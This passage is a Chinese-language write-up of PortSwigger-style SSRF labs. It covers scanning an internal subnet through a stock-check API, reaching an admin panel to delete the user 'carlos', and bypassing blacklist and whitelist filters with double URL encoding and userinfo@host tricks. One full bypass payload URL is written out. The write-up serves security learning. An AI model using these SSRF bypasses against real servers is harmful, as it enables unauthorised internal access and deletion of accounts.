于是我们想到，直接将这个接口让服务器自己进行访问调用，便能利用这个端口

把这个请求参数之间改成删除账号的接口

这个接口的具体url可以通过上面手动点击删除时抓包获得

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MTdjNTExYzhlZmY4NWEyYjdhYmI4OWU3MTljYjZkNTBfZjUzMGJhNmY3MTMzODIzOWJmODNiMjk1ODYyNzQ3OThfSUQ6NzY3MDA1MTA4ODczNjgxNjM5OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)



![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZWNjMzIzZjg2NzQ4NzQwNTEyOGVjZTk1Y2ViZWIzZjhfMTEyNDViZTliYWQ0ZWU2ZWU3OTFlZWQ2MGY4ZTQxOTNfSUQ6NzY3MDA1MTQ5NjE4NDY0Njg3OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

发包就能成功利用服务器发送请求删除题目要求账号



## **Lab: Basic SSRF against another back\-end system**

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDljY2VjOGY3OGU2OWVjN2VlMjIwOTE1ZTU3YjI5MzRfYjI5NjQxZGQ4ODdjNzZkMDIzZmZiNzU4MTMxN2FhMDdfSUQ6NzY3MDA1MTg3NDU4NjM2NDg5MF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

本实验存在库存查询功能，该功能会从一套内部系统获取数据。 要完成实验：利用库存查询功能，扫描内网 `192.168.0.X` 网段，寻找运行在 8080 端口 的管理后台；找到后台后，通过该接口删除用户 `carlos`。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGQ1MGIzNzZkYzgwZDk0NDZiZGNhYmNjOGZjYTk5M2VfMjg2ZmNmOTMxMTMwNDdiMTVmOGVjY2EzYzRhMjVlNDlfSUQ6NzY3MDA1NDgwOTU1MDMxMDYxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

抓包之后进行整个网段的爆破

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTFhMWExNDUzNTFiZWJlMjgxOTY5N2M3NDBhNGE5MmJfZjZmYTAxYTIxYzRkZDA4NmI2NWY3NzYxMzY5ODU3ZWZfSUQ6NzY3MDA1NDg4MDE3NDk4NDQ1OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

爆破完后发现只有41回显不同

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWY3MDIwOWQ3NjAwOGUyM2RlODQ3MzMwYmNiNWQ2MGZfNzRkYTRiYmM5MmMwN2RhODEyNmY0ZWM5Y2UxOTAzMjFfSUQ6NzY3MDA1NDk2NzIwMjI1Mzc1NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTQ1OTM5MmVmMDI5ZmFjM2ZiMTQ5OTI3Y2RkMmU5OTRfODE2M2EzODNhYTgxYTJkNjM5ZDIxZGY3YmIxMGU5YmVfSUQ6NzY3MDA1NTA3Njk3OTYwODUxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjExNzY4NTU5ZjQ5MTFjZDhmOWU4ZDgzNjc1MWYyMjRfMDE0NGQxMzdmOWY2NzIyZmRlNDkwZDM0ZGZkZDU1NGVfSUQ6NzY3MDA1NTEzNjI0MDY2NzU3OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

可能是我们请求包的路径不对，根据上一题的经验和猜测，直接访问/admin路径

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmY1MzY3NWJiYWUyNTRhOGIxZDNkY2IxNzBkNzE5MmZfMjJkZDNiMGMwY2Q5OGZjYTg4MTE4ZWNhYTAyZjFmZjBfSUQ6NzY3MDA1NTI5OTQ2NjAyMTg0MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

确实有回显，那么还是调用刚才的删除账号接口，进行删除

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OWMzMDU4MzhmZDU1MWExZWM3NmU2Zjk2YmZmMzJhMzRfMTMxOGNjZDdlYmUzYjNiNDlmZTJjMGM1ZmRkZjgyMDBfSUQ6NzY3MDA1NTU1OTg3MDA0MTAxNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGU3Zjk3ZGU3NjQ1MDVmNmViODE2ZGU0YmEyNmE3NTVfYTdkZTJjMmJjM2NkZmRjZjBlODZiZTcwNjk2MWU3MzBfSUQ6NzY3MDA1NTY1OTI1ODQzMjc3MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这边其实就能证明，如果服务器存在SSRF漏洞那么就能实现内网的探测



## **Lab: SSRF with blacklist\-based input filter**

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTM0MjVjMjk3N2Q3N2YwMTE4YWJiZWFlNzAxNTA2YmNfYTcwMGFmYjkyMDQzMDhiYjE0YWVjOWFmZmU1NTFlZmVfSUQ6NzY3MDA1NTk0Njc2MDU4ODI0NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

本实验包含库存查询功能，该功能会从内部系统获取数据。 要完成实验：修改库存查询的 URL，访问位于 `http://localhost/admin` 的管理后台，并删除用户 `carlos`。

开发者部署了两套简陋的 SSRF 防护机制，你需要找到方法绕过。

尝试之前的payload发现会报错

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjlkMzZjNDJlOTdmYmU4OGU0NTYyNDRhYWMwNWQ0NzNfYmZiNzdjMmQ5YzBlMzMxMzBmMWQzYzM3YzYyYmM5NDdfSUQ6NzY3MDA1Njg2MjgyOTYyODY5NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

出于安全原因，外部库存查询被阻止

试了一下127\.0\.0\.1也不行

猜测应该是服务器端对本机地址进行了过滤检查



对url简写发现也不行

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmI3NDkwOGQ5ODFlNzcwZDkzODJhNDE3YzYyMWI5NzlfMTJjNGNmYzMzODI4ZDFmNGE2OTNkYmFjYjdlYmFkZjNfSUQ6NzY3MDA2MTE4MzQ3MDU3MDQ1OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

看了一下题目提示，发现可以对字母a进行双重url编码

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODY4YzE4ZGUxYjM2MWRiZTI3Mjk2OTQ4NmJkMzU1NjRfN2YxYWQyM2M2ZTkxODY2YzE3MWMwMDMyN2MxNGQ5OTJfSUQ6NzY3MDA2MjIwNTc4MTk4NjUxM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这个编码的时候，我用了我最习惯用的cyberchef发现编码不了

豆包说：

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=M2UxYzY2ZWZhMWVkMTg3NzdjNmVlYTY5MWM5NmE1YTVfNTZjYjJlNzI1ZmYwNjY3OGVlOTBiOTg3NGNlMTQzZDVfSUQ6NzY3MDA2MjU0MDkwOTE4NjM0NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

于是我只能用burpsuite的decoder模块进行编码，刚好熟悉一下吧，毕竟感觉高手都是用这个

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTBmMDNkZjUwZTg2OWUyYmFlYjAyZGY1Yzk0NzkxODBfNzBhNzA3NzEzYTE2MDc0ZGY4ODNhZDljZjNmZjMxOTFfSUQ6NzY3MDA2Mjc5NjE4MDQ3NDgxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTQ2YjZmNjkxNGQ1ODIyMjNlZDY4YWEzZjJjYmM5MWVfMTc5ZDE0YTgyNTMzZjY2ZDU2OTEyOGFmZDdmZTkxNTJfSUQ6NzY3MDA2MjgyOTY5MjU3MDU1NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTNiODc3Yzk5MDk0NzgxNGIyMDJiZThiNWQ1M2U5ZmZfOWY2ODkzYWIyMjRkZjIxZTM2YzBiZGM3YTQzNjdmMTJfSUQ6NzY3MDA2Mjk5MDEzNzc1Njg3Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)



## **Lab: SSRF with whitelist\-based input filter**

刚才是黑名单过滤，现在是白名单过滤了

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NmIwZDA4NjMxZDliZGRkOWZhMDNjNTdhYzQ0YmQxNmZfYmRlZDgxYTY1ZDQwMDNlZmYyMzhkMzA5NGY1YjE5MWZfSUQ6NzY3MDA2MzM0MjI2MjM3MzY1MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

1. 将 `stockApi` 参数内 URL 修改为 `http://127.0.0.1/`，可以观察到应用会解析 URL、提取主机名，并与白名单进行校验。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjUzZjg3NDFmMzVmYThjODJkM2RiYWYwMDc1YTRjZjJfOTEwNDc5NmVkZGU2NjUyZDBhMzk4M2MwNDQ1NDlmYTlfSUQ6NzY3MDA2ODUxMTkzNDg3NjYxMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

2. 将 URL 修改为 `http://username@stock.weliketoshop.net/`，请求被接受。说明 URL 解析器支持内嵌账号凭证（userinfo@host）格式。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDI3ODllMjU0NTAxZDBiNjM0ZWI2NDM4YjdkYWVmODhfMjY5ZTIwNzg5OGVhY2YwODM0NmJmMmM4NjEyMGNlOGZfSUQ6NzY3MDA2OTMyOTIxNjI2MTM5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

3. 在用户名后追加 `#`，会发现 URL 被拒绝。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTJjYzIzNWYwNGRhZGUxOWIwMzU4ZjIxMzU0Y2ExMjlfNGE0YmM0MjhjNzhmNjcyYTk3NjZmOGI5MjAyMTQ0YjVfSUQ6NzY3MDA2OTQzMDMyNzU0NDgxM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

4. 对 `#` 进行双重 URL 编码得到 `%2523`，此时会收到高度可疑的 “服务器内部错误” 响应。代表服务器尝试连接到字符串 `username`。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTg3NWEyYTYwMzZhZTk1MzM3MWVjNmEyMzdmOGExMmZfYTdhNjY3ZmIxMzI4NmUyZDU1MWZmZjMzZGUwNGRmOGZfSUQ6NzY3MDA2OTg0NDcxMzMyNzU5Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

5. 想要访问后台并删除目标用户，将 URL 修改为：`http://localhost:80``%``2523@stock.weliketoshop.net/admin/delete?username=carlos`

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjNkMzQ4MjEzZTk3ZDczMzZlYjI2ZTRlOGE5YTQyMGJfODU3YjUyNjVhZTM3NWVmNWJhNmI5MDBhOTM5OTViMWNfSUQ6NzY3MDA3MDA4OTI0MDMwMDg0Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Nzk5ZWViYmZjMDM5Y2FkZmVmMjI4YTE0YWJmMDNmOTJfYWVjODljNjE3ZDUxZTBiZmQ0MTVhZDBhNmUwMDE0NWZfSUQ6NzY3MDA3MDEyODE3Njk0MjA2MF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
